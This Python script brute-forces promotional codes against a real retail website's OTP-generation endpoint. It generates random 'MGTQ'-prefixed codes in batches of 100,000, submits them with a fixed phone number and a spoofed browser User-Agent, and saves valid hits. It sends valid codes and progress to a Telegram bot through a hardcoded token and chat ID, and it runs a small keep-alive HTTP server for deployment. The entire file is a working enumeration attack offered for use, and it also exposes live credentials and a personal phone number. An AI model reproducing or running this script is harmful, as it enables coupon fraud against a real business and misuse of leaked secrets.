import os
import time
import random
import string
import threading
import json
import requests
from concurrent.futures import ThreadPoolExecutor
from http.server import HTTPServer, BaseHTTPRequestHandler

BASE_URL = "https://www.ossw.theofferclub.in"
OTP_ENDPOINT = f"{BASE_URL}/home/generateOTP"
TEST_MOBILE = "9038529139"

NUM_CODES = 100000
MAX_WORKERS = 5
DELAY_PER_THREAD = 2.0
STATUS_INTERVAL = 100

TELEGRAM_TOKEN = "8789555036:AAGw-EovbhVHoI81lD6QJ9AeFhn4eJNnFaY"
TELEGRAM_CHAT_ID = "5177144784"

print_lock = threading.Lock()
code_counter = 0
valid_counter = 0

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text}, timeout=5)
    except Exception as e:
        print(f"Telegram error: {e}")

def generate_random_code():
    prefix = "MGTQ"
    chars = string.ascii_uppercase + string.digits
    return prefix + ''.join(random.choices(chars, k=6))

def check_code(code):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {"phone": TEST_MOBILE, "ccode": code}
    try:
        r = requests.post(OTP_ENDPOINT, data=data, headers=headers, timeout=15)
        if r.status_code != 200:
            return False
        json_resp = r.json()
        return json_resp.get("status") == "success"
    except:
        return False

def process_code(code):
    global code_counter, valid_counter
    is_valid = check_code(code)
    with print_lock:
        code_counter += 1
        if is_valid:
            valid_counter += 1
            msg = f"🎉 VALID CODE!\n🔑 {code}\n📱 {TEST_MOBILE}\n⏰ {time.ctime()}"
            send_telegram_message(msg)
            with open("valid_codes.txt", "a") as f:
                f.write(f"{code} | {TEST_MOBILE} | {time.ctime()}\n")
            print(f"✅ {code}")
        else:
            print(f"❌ {code}")

        if code_counter % STATUS_INTERVAL == 0:
            status_msg = f"📊 Status: {code_counter} codes checked, {valid_counter} valid found."
            send_telegram_message(status_msg)

    time.sleep(DELAY_PER_THREAD)

def run_validator():
    send_telegram_message("🚀 Validator started (clean version)")
    send_telegram_message(f"🎯 Target mobile: {TEST_MOBILE}")
    print("Validator running...")
    while True:
        codes = [generate_random_code() for _ in range(NUM_CODES)]
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            executor.map(process_code, codes)
        time.sleep(5)

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Validator running")
    def log_message(self, format, *args):
        pass

def start_http_server():
    port = int(os.environ.get("PORT", 5000))
    server = HTTPServer(('0.0.0.0', port), Handler)
    print(f"HTTP server on port {port}")
    server.serve_forever()

if __name__ == "__main__":
    threading.Thread(target=run_validator, daemon=True).start()
    start_http_server()
